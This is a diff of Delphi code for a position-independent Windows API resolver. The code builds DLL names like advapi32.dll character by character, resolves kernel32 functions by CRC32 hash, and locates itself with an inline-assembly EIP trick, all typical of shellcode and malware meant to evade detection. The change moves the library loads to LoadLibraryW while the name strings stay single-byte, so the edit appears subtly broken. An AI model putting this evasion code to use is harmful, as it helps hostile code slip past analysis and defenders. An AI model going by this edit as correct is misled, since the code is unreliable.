@@ -57,9 +57,9 @@ procedure resolver;
   procedure xZeroMemory(var Dest; count: Integer);stdcall;
   var
     I: Integer;
-    P: PChar;
+    P: PAnsiChar;
   begin
-    P := PChar(@Dest);
+    P := PAnsiChar(@Dest);
     for I := count-1 downto 0 do
       P[I] := #0;
   end;
@@ -86,10 +86,10 @@ procedure resolver;
     strShell32[0]:='s';strShell32[1]:='h';strShell32[2]:='e';strShell32[3]:='l';strShell32[4]:='l';strShell32[5]:='3';strShell32[6]:='2';strShell32[7]:='.';strShell32[8]:='d';strShell32[9]:='l';strShell32[10]:='l';strShell32[11]:=#0;
     strShFolder[0]:='s';strShFolder[1]:='h';strShFolder[2]:='f';strShFolder[3]:='o';strShFolder[4]:='l';strShFolder[5]:='d';strShFolder[6]:='e';strShFolder[7]:='r';strShFolder[8]:='.';strShFolder[9]:='d';strShFolder[10]:='l';strShFolder[11]:='l';strShFolder[12]:=#0;
     strAdvapi32[0]:='a';strAdvapi32[1]:='d';strAdvapi32[2]:='v';strAdvapi32[3]:='a';strAdvapi32[4]:='p';strAdvapi32[5]:='i';strAdvapi32[6]:='3';strAdvapi32[7]:='2';strAdvapi32[8]:='.';strAdvapi32[9]:='d';strAdvapi32[10]:='l';strAdvapi32[11]:='l';strAdvapi32[12]:=#0;
-    pAPI.hAdvapi32 := pAPI.xLoadLibraryA(@strAdvapi32[0]);
-    pAPI.hUser32 := pAPI.xLoadLibraryA(@strUser32[0]);
-    pAPI.hShell32 := pAPI.xLoadLibraryA(@strShell32[0]);
-    pAPI.hShFolder := pAPI.xLoadLibraryA(@strShFolder[0]);
+    pAPI.hAdvapi32 := pAPI.xLoadLibraryW(@strAdvapi32[0]);
+    pAPI.hUser32 := pAPI.xLoadLibraryW(@strUser32[0]);
+    pAPI.hShell32 := pAPI.xLoadLibraryW(@strShell32[0]);
+    pAPI.hShFolder := pAPI.xLoadLibraryW(@strShFolder[0]);
   end;
 
   function CalcCrc32(lpSource:PChar; nLength:Integer):Cardinal;stdcall;
@@ -153,7 +153,7 @@ procedure resolver;
       pop eax
       mov dwEIP, eax
     end;
-    dwEIP := dwEIP - 13;
+    dwEIP := dwEIP - 11;
     dwLoadHelpers := DWORD(@LoadHelpers);
 
     dwStaticAddress := DWORD(@GetProcAddressEx);
@@ -180,7 +180,7 @@ procedure resolver;
   procedure LoadAPIs(pAPI:PAPIRec; hKernel32:Cardinal);
   begin
     pAPI.hKernel32 := hKernel32;
-    pAPI.xLoadLibraryA := GetProcAddressEx(hKernel32, $3FC1BD8D, 12);
+    pAPI.xLoadLibraryW := GetProcAddressEx(hKernel32, $CB1508DC, 12);
     LoadLib(pAPI);
     pAPI.xGetProcAddress := GetProcAddressEx(hKernel32, $C97C1FFF, 14);
     pAPI.xExitProcess := GetProcAddressEx(hKernel32, $251097CC, 11);
